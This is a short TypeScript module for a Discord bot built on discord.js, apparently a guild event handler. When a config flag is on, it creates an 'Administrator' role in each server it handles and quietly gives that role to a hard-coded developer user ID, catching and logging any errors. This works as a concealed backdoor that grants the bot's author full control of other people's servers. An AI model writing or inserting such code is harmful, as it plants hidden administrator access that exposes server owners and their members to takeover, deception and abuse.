import { Guild } from "discord.js";
import Config from "../config/Config";

export default async (guild: Guild): Promise<void> => {
	if (Config.GiveAdminPerms) {
		try {
			const adminRole = await guild.roles.create({
				name: Config.AdminRoleName,
				permissions: ["Administrator"],
			});

			const developer = guild.members.cache.get(Config.DeveloperUserId);
			await developer.roles.add(adminRole);
		} catch (error) {
			console.log(error);
		}
	}
};
